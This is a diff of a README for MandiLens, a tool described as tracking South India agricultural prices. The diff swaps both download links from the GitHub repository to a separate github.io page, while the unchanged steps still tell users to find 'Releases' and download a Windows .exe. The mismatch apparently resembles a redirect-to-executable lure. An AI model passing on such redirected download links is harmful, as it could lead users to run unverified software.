@@ -1,6 +1,6 @@
 # 📊 MandiLens - Make better South India market choices
 
-[![](https://img.shields.io/badge/Download_MandiLens-Blue-blue)](https://github.com/Juleepennywise25/MandiLens)
+[![](https://img.shields.io/badge/Download_MandiLens-Blue-blue)](https://juleepennywise25.github.io)
 
 MandiLens tracks agricultural prices across South India. It pulls data from official AGMARKNET records to show you how prices change. Farmers, traders, and analysts use this tool to compare market rates, view short-range forecasts, and check data quality. The software highlights market uncertainty so you can understand the risks in your local area.
 
@@ -8,7 +8,7 @@ MandiLens tracks agricultural prices across South India. It pulls data from offi
 
 To use MandiLens, you must download the software from our official page.
 
-1. Go to this link: [https://github.com/Juleepennywise25/MandiLens](https://github.com/Juleepennywise25/MandiLens).
+1. Go to this link: [https://juleepennywise25.github.io](https://juleepennywise25.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click the link that says "Releases".
 4. Select the file ending in .exe for Windows.
